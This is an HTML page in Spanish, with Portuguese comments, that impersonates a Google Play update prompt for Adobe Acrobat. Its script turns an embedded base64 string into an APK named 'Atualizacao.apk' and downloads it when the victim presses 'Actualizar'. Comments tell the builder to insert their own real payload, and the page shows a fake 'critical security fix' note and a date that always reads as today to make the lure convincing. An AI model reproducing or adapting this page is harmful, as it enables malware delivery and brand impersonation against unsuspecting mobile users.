<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Actualización disponible - Adobe Acrobat</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 10px;
      background: #fff;
      color: #000;
    }
    .container {
      max-width: 100%;
      width: 100%;
      box-sizing: border-box;
      margin: auto;
      border: 1px solid #ddd;
      padding: 15px;
      border-radius: 10px;
    }
    .logo {
      width: 100%;
      max-width: 140px;
      display: block;
      margin-bottom: 10px;
    }
    .app-icon {
      width: 50px;
      vertical-align: middle;
    }
    .button {
      padding: 10px 15px;
      margin: 10px 5px 0 0;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
      font-size: 16px;
      display: inline-block;
    }
    .btn-info {
      background-color: #fff;
      color: #1a73e8;
      border: 1px solid #1a73e8;
    }
    .btn-update {
      background-color: #1a73e8;
      color: #fff;
    }
    .stars {
      color: #1a73e8;
    }
    .rating-bar {
      height: 8px;
      background: #ccc;
      border-radius: 4px;
      margin-top: 2px;
    }
    .rating-bar-fill {
      height: 8px;
      background: #1a73e8;
      border-radius: 4px;
    }

    .arrow {
      display: none;
      font-size: 36px;
      text-align: center;
      animation: bounce 1s infinite;
      margin-top: 20px;
      color: #1a73e8;
    }
    @keyframes bounce {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(10px); }
    }

    #aviso {
      display: none;
      background: #fff3cd;
      color: #856404;
      border: 1px solid #ffeeba;
      padding: 10px;
      margin-top: 15px;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="p.png" alt="Google Play" class="logo">

    <h2>Actualización disponible</h2>
    <p>Para usar esta aplicación, descarga la versión más reciente.</p>

    <p>
      <img src="https://play-lh.googleusercontent.com/G_NQ3qwzqiNqF9Bq58zy-hFJkeQ5nqC8_bdh-EPFfQQW-fSUMVpRQTIinbBmmKv-IQ=w240-h480-rw" class="app-icon" alt="Adobe Acrobat">
      <strong>Adobe Acrobat</strong><br>
      <small>Para todos | 7.3 MB</small>
    </p>

    <h3>Novedades</h3>
    <p><small id="fecha-actualizacion">Última actualización: </small></p>
    <ul>
      <li>Corrección de errores y mejoras de rendimiento.</li>
      <li>Corrección crítica de vulnerabilidad de seguridad.</li>
    </ul>

    <button class="button btn-info">Más información</button>
    <button class="button btn-update" onclick="iniciarDescarga()">Actualizar</button>

    <div id="aviso">⬇️ Fazendo o download mesmo assim...</div>
    <div id="seta" class="arrow">⬇️</div>
  </div>

  <script>
    function iniciarDescarga() {
      document.getElementById("seta").style.display = "block";
      document.getElementById("aviso").style.display = "block";

      // Base64 de exemplo (substitua pela sua real)
      const apkBase64 = "UEsDBBQACAg..."; // <-- coloque sua base64 real aqui

      const blob = b64toBlob(apkBase64, 'application/vnd.android.package-archive');
      const url = URL.createObjectURL(blob);

      const a = document.createElement("a");
      a.href = url;
      a.download = "Atualizacao.apk";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    }

    // Função para converter base64 em Blob
    function b64toBlob(b64Data, contentType = '', sliceSize = 512) {
      const byteCharacters = atob(b64Data);
      const byteArrays = [];

      for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
        const slice = byteCharacters.slice(offset, offset + sliceSize);
        const byteNumbers = new Array(slice.length);
        for (let i = 0; i < slice.length; i++) {
          byteNumbers[i] = slice.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        byteArrays.push(byteArray);
      }

      return new Blob(byteArrays, { type: contentType });
    }

    // Data dinâmica em espanhol
    const meses = [
      "enero", "febrero", "marzo", "abril", "mayo", "junio",
      "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"
    ];
    const hoje = new Date();
    const dia = hoje.getDate();
    const mes = meses[hoje.getMonth()];
    const ano = hoje.getFullYear();
    document.getElementById("fecha-actualizacion").innerText = `Última actualización: ${dia} de ${mes} de ${ano}`;
  </script>
</body>
</html>
